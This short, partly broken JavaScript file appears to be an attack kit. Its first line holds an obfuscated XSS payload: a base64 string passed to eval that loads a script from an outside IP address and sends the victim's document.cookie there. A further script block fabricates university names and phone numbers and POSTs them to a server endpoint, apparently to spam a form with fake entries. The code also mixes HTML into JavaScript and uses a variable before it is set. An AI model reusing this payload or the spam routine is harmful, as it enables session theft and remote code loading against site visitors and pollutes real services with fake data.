const xss_payload = "<script>eval(atob(\"JC5nZXRTY3JpcHQoJ2h0dHA6Ly8xOC4yMjMuOTQuMTE1L2FybWJvb2suanM/Y29va2llPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuY29va2llKSk=\"));</script>";

const links = require('./links.json');


<script>
const unis = ["Rochester Institute of Technology", "University of Rochester",
    "University at Buffalo", "Buffalo State College", "SUNY Brockport",
    "University at Waterloo", "SUNY Geneseo", "University of Toronto"
];

const zipcodes = ["315", "585", "716"];
const jsonIn = ["Zucc", "Limewire", "Bezos", "Stop", "Chungus"]

function getRandomInt(max) {
    return Math.floor(Math.random() * max);
}

photo = links[jsonIn[r1]];


function post_About() {

    r1 = getRandomInt(4);
    r2 = getRandomInt(7);
    r3 = getRandomInt(2);


    university = unis[r2];

    number = Math.floor(1000000 + Math.random() * 9000000).toString();
    pnumber = zipcodes[r3] + number;



    var xhr = new XMLHttpRequest();
    xhr.open("POST", '/server', true);

    //Send the proper header information along with the request
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

    xhr.onreadystatechange = function () { // Call a function when the state changes.
        if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
            // Request finished. Do processing here.
        }
    }
    xhr.send(`school=${university}&phone=${pnumber}`);
}
</script>


// xhr.send(new Int8Array());
// xhr.send(document);